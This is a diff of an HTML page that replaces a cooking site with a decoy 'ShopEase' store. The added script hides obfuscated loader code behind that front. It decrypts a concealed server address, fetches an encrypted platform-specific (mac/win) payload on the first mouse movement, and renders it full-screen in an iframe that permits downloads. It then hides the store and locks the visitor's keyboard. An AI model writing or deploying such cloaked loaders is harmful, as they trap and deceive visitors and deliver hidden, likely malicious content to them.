@@ -1,329 +1,312 @@
-<!doctype html>
-<html lang="zxx">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-	<!-- Meta -->
-	<meta charset="utf-8">
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-	<meta name="description" content="Premium culinary recipe calibrations, sourdough hydration logs, woodfired heating indexes, and emulsion whisk testing parameters.">
-	<!-- Page Title -->
-    <title>RecipeQuest Zone | Premium Culinary Calibration & Recipe Discovery</title>
-	<!-- Bootstrap Css -->
-	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-	<!-- Font Awesome Icon Css-->
-	<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-	<!-- Main Custom Css -->
-	<link href="assets/style.css" rel="stylesheet">
-    <!-- Google tag (gtag.js) -->
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
-    <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
 
-      gtag('config', 'G-0LY0HY7L01');
-    </script>
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
+
+
 </head>
 <body>
 
-    <!-- Topbar Section Start -->
-    <div class="topbar">
-        <div class="container text-center">
-            <i class="fa-solid fa-utensils"></i> Independent Sourdough Hydration Calibrations & Culinary Proofing Audits
-        </div>
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
     </div>
-    <!-- Topbar Section End -->
+  </div>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-    <!-- Header Start -->
-	<header class="main-header">
-        <div class="container">
-            <div class="header-row">
-                <!-- Logo Left -->
-                <a class="navbar-brand" href="index.php">
-                    RecipeQuest <span>Zone</span>
-                </a>
-                
-                <!-- Nav Links Center -->
-                <nav class="d-none d-lg-block">
-                    <ul class="header-nav">
-                        <li><a class="active" href="index.php">Home</a></li>                                
-                        <li><a href="about.html">Culinary Bench</a></li>
-                        <li><a href="blog.html">Kitchen Logs</a></li>
-                        <li><a href="contact.html">Curator Desk</a></li>
-                    </ul>
-                </nav>
-                
-                <!-- Actions Right -->
-                <div class="header-actions">
-                    <a href="contact.html"><i class="fa-regular fa-user"></i> Account</a>
-                    <a href="blog.html"><i class="fa-solid fa-basket-shopping"></i> Pantry</a>
-                </div>
-            </div>
-        </div>
-	</header>
-	<!-- Header End -->
-   
-    <!-- Diagonal Bento Grid Hero Section Start (Image Section 1 - Text Removed) -->
-    <section class="diagonal-bento">
-        <div class="bento-card card-one" data-reveal="left">
-            <span class="quadrant-label">[ QUADRANT 01 // DOUGH ]</span>
-            <img src="assets/img/hero.jpg" alt="Rustic fresh pasta flour and egg preparation close up">
-        </div>
-        <div class="bento-card card-two" data-reveal="zoom">
-            <span class="quadrant-label">[ QUADRANT 02 // OVEN ]</span>
-            <img src="assets/img/coll_1.jpg" alt="Artisanal sourdough bread loaves straight from wood oven">
-        </div>
-        <div class="bento-card card-three" data-reveal="zoom">
-            <span class="quadrant-label">[ QUADRANT 03 // HERBS ]</span>
-            <img src="assets/img/coll_2.jpg" alt="Mortar and pestle grinding fresh herbs and sea salt">
-        </div>
-        <div class="bento-card card-four" data-reveal="right">
-            <span class="quadrant-label">[ QUADRANT 04 // FATS ]</span>
-            <img src="assets/img/coll_3.jpg" alt="Golden organic olive oil pouring detail">
-        </div>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
     </section>
-    <!-- Diagonal Bento Grid Hero Section End -->
 
-    <!-- Section 1: The Culinary Compass (Diamond Grid Showcase) -->
-    <section class="compass-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Culinary Audits</span>
-                <h2>The Culinary Compass</h2>
-            </div>
-            
-            <div class="compass-container">
-                <!-- Diamond 1 -->
-                <div class="diamond-wrapper" data-reveal="left">
-                    <div class="diamond-card">
-                        <div class="diamond-inner">
-                            <span>[ CALIBER 01 ]</span>
-                            <h3>Yeast Growth</h3>
-                            <p>We monitor wild yeast rise heights across proofing temperatures to block sour collapse.</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Diamond 2 -->
-                <div class="diamond-wrapper" data-reveal="zoom">
-                    <div class="diamond-card">
-                        <div class="diamond-inner">
-                            <span>[ CALIBER 02 ]</span>
-                            <h3>Emulsion Matrix</h3>
-                            <p>We log oil drop boundaries under mechanical shear whisks to protect vinaigrette spreads.</p>
-                        </div>
-                    </div>
-                </div>
-                
-                <!-- Diamond 3 -->
-                <div class="diamond-wrapper" data-reveal="right">
-                    <div class="diamond-card">
-                        <div class="diamond-inner">
-                            <span>[ CALIBER 03 ]</span>
-                            <h3>Gluten Stretching</h3>
-                            <p>We audit flour protein chains during stretch intervals to secure long-term dough life.</p>
-                        </div>
-                    </div>
-                </div>
-            </div>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
+
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
         </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
     </section>
-    <!-- Section 1 End -->
 
-    <!-- Section 2: Sticky Card Stack Overlap (Image Section 2 & 3) -->
-    <section class="sticky-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Hearth Standards</span>
-                <h2>Anatomy of Sourdough</h2>
-            </div>
-            
-            <div class="sticky-cards-stack">
-                <!-- Sticky Card 1 -->
-                <div class="sticky-card" style="z-index: 1;">
-                    <div class="sticky-card-img">
-                        <img src="assets/img/prod_1.jpg" alt="Artisanal sourdough boule baking close up">
-                    </div>
-                    <div class="sticky-card-content">
-                        <span>Process Stage 1</span>
-                        <h3>Yeast Cultivation</h3>
-                        <p>We measure ambient humidity coordinates and wild flour variables to cultivate high-retention yeast. This provides sourdough boules with stable expansion chambers and deep crust scores.</p>
-                        <a href="about.html" class="btn-default mt-4 align-self-start">Explore Yeast Logs</a>
-                    </div>
-                </div>
-                
-                <!-- Sticky Card 2 -->
-                <div class="sticky-card" style="z-index: 2;">
-                    <div class="sticky-card-img">
-                        <img src="assets/img/prod_2.jpg" alt="Plated fresh organic green salad with vinaigrette">
-                    </div>
-                    <div class="sticky-card-content">
-                        <span>Process Stage 2</span>
-                        <h3>Emulsion & Whisk Ratios</h3>
-                        <p>We track the rate of emulsion drop decay against acids and whisk speeds. This keeps sauces thick and prevents oil separation during critical culinary serving windows.</p>
-                        <a href="about.html" class="btn-default mt-4 align-self-start">Explore Emulsion Specs</a>
-                    </div>
-                </div>
-                
-                <!-- Sticky Card 3 -->
-                <div class="sticky-card" style="z-index: 3;">
-                    <div class="sticky-card-img">
-                        <img src="assets/img/prod_3.jpg" alt="Wood-fired pizza baking inside hot stone oven">
-                    </div>
-                    <div class="sticky-card-content">
-                        <span>Process Stage 3</span>
-                        <h3>Hearth Fire Heat Indexes</h3>
-                        <p>We record temperature conduction speeds inside hot stone ovens to maintain standard baking rates. This prevents dough crust base burns while cooking pizzas.</p>
-                        <a href="about.html" class="btn-default mt-4 align-self-start">Explore Oven Index</a>
-                    </div>
-                </div>
-            </div>
-        </div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
     </section>
-    <!-- Section 2 End -->
 
-    <!-- Section 3: Culinary Specs Table -->
-    <section class="specs-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Formula Matrix</span>
-                <h2>Culinary Parameter Specs</h2>
-            </div>
-            
-            <table class="specs-table" data-reveal="zoom">
-                <thead>
-                    <tr>
-                        <th>Dish Type</th>
-                        <th>Hydration Rate</th>
-                        <th>Proofing Temp</th>
-                        <th>Friction Limits</th>
-                    </tr>
-                </thead>
-                <tbody>
-                    <tr>
-                        <td><strong>Sourdough Boule</strong></td>
-                        <td>75% Hydration</td>
-                        <td>24&deg;C (Ambient room)</td>
-                        <td>24 Hours (Cold bulk proof)</td>
-                    </tr>
-                    <tr>
-                        <td><strong>Hand-Pulled Pasta</strong></td>
-                        <td>55% Hydration</td>
-                        <td>20&deg;C (Cool board)</td>
-                        <td>2 Hours (Gluten rest)</td>
-                    </tr>
-                    <tr>
-                        <td><strong>Emulsified Sauce</strong></td>
-                        <td>15% Acid ratio</td>
-                        <td>18&deg;C (Cold whip)</td>
-                        <td>15 Minutes (Active whisk)</td>
-                    </tr>
-                    <tr>
-                        <td><strong>Wood-Fired Pizza</strong></td>
-                        <td>68% Hydration</td>
-                        <td>400&deg;C (Stone hearth)</td>
-                        <td>90 Seconds (Fast bake)</td>
-                    </tr>
-                </tbody>
-            </table>
-        </div>
-    </section>
-    <!-- Section 3 End -->
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
+  </div>
 
-    <!-- Section 4: SVG Liquid Mixing Bowl Indicators -->
-    <section class="bowls-section">
-        <div class="container">
-            <div class="section-title" data-reveal>
-                <span>Performance Calibration</span>
-                <h2>Mixing Bowl Calibration Meters</h2>
-            </div>
-            
-            <div class="bowls-grid">
-                <!-- Bowl 1 -->
-                <div class="bowl-item" data-reveal="zoom">
-                    <div class="bowl-svg-container">
-                        <svg viewBox="0 0 100 100">
-                            <!-- Liquid Fill -->
-                            <rect x="0" y="100" width="100" height="100" fill="var(--accent-color)" clip-path="url(#bowl-clip-1)" class="liquid-fill" data-value="75" />
-                            <!-- Bowl outline -->
-                            <path d="M10,40 Q50,90 90,40 Z" fill="none" stroke="var(--accent-sage)" stroke-width="4" />
-                            <clipPath id="bowl-clip-1">
-                                <path d="M10,40 Q50,90 90,40 Z" />
-                            </clipPath>
-                        </svg>
-                        <div class="bowl-value">75%</div>
-                    </div>
-                    <h4>Dough Hydration</h4>
-                    <p>Standard hydration limits for open air-bubble structure inside bread crumbs.</p>
-                </div>
-                
-                <!-- Bowl 2 -->
-                <div class="bowl-item" data-reveal="zoom">
-                    <div class="bowl-svg-container">
-                        <svg viewBox="0 0 100 100">
-                            <!-- Liquid Fill -->
-                            <rect x="0" y="100" width="100" height="100" fill="var(--accent-sage)" clip-path="url(#bowl-clip-2)" class="liquid-fill" data-value="92" />
-                            <!-- Bowl outline -->
-                            <path d="M10,40 Q50,90 90,40 Z" fill="none" stroke="var(--accent-color)" stroke-width="4" />
-                            <clipPath id="bowl-clip-2">
-                                <path d="M10,40 Q50,90 90,40 Z" />
-                            </clipPath>
-                        </svg>
-                        <div class="bowl-value">92%</div>
-                    </div>
-                    <h4>Yeast Cultivation</h4>
-                    <p>Optimal wild yeast growth rate to secure carbon pockets during bulk rises.</p>
-                </div>
-                
-                <!-- Bowl 3 -->
-                <div class="bowl-item" data-reveal="zoom">
-                    <div class="bowl-svg-container">
-                        <svg viewBox="0 0 100 100">
-                            <!-- Liquid Fill -->
-                            <rect x="0" y="100" width="100" height="100" fill="var(--accent-color)" clip-path="url(#bowl-clip-3)" class="liquid-fill" data-value="88" />
-                            <!-- Bowl outline -->
-                            <path d="M10,40 Q50,90 90,40 Z" fill="none" stroke="var(--accent-sage)" stroke-width="4" />
-                            <clipPath id="bowl-clip-3">
-                                <path d="M10,40 Q50,90 90,40 Z" />
-                            </clipPath>
-                        </svg>
-                        <div class="bowl-value">88%</div>
-                    </div>
-                    <h4>Emulsion Stability</h4>
-                    <p>Calculated sauce shelf-life efficiency indexes under standard cold whips.</p>
-                </div>
-            </div>
-        </div>
-    </section>
-    <!-- Section 4 End -->
 
-    <!-- Centered Footer Start -->
-    <footer class="flat-footer text-center">
-        <div class="container">
-            <div class="footer-brand">
-                <h3>RecipeQuest <span>Zone</span></h3>
-                <p>Independent research logs for artisanal culinary calibrations, sourdough hydrations, woodfired heating indexes, and emulsion whisk testing parameters.</p>
-                <p style="font-size: 14px; opacity: 0.8; margin-bottom: 30px;"><i class="fa-solid fa-location-dot"></i> 181 Mercer Street, New York, NY 10012, United States<br><i class="fa-solid fa-phone"></i> +1-888-777-5845</p>
-            </div>
-            
-            <ul class="footer-links">
-                <li><a href="about.html">Culinary Bench</a></li>
-                <li><a href="blog.html">Kitchen Logs</a></li>
-                <li><a href="contact.html">Curator Desk</a></li>
-                <li><a href="privacy-policy.html">Privacy Policy</a></li>
-                <li><a href="cookies.html">Cookies Policy</a></li>
-                <li><a href="disclaimer.html">Disclaimer</a></li>
-                <li><a href="terms.html">Terms of Service</a></li>
-            </ul>
-            
-            <div class="footer-bottom">
-                <span>SYSTEM STATUS: COMPLIANT // GTAG: G-0LY0HY7L01</span>
-                <span>&copy; 2026 RecipeQuest Zone. Independent culinary archives. Not a commercial food shop.</span>
-            </div>
-        </div>
-    </footer>
-    <!-- Centered Footer End -->
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
 
-    <script src="assets/app.js"></script>
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX19WdeWIW+JjOZDd/ARDDoB0HqxpxoffIe0gnt6Af64Ylaqb2dB5VfYevkxwmrWoWT60lhhX3+OeNg==";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
 </body>
 </html>
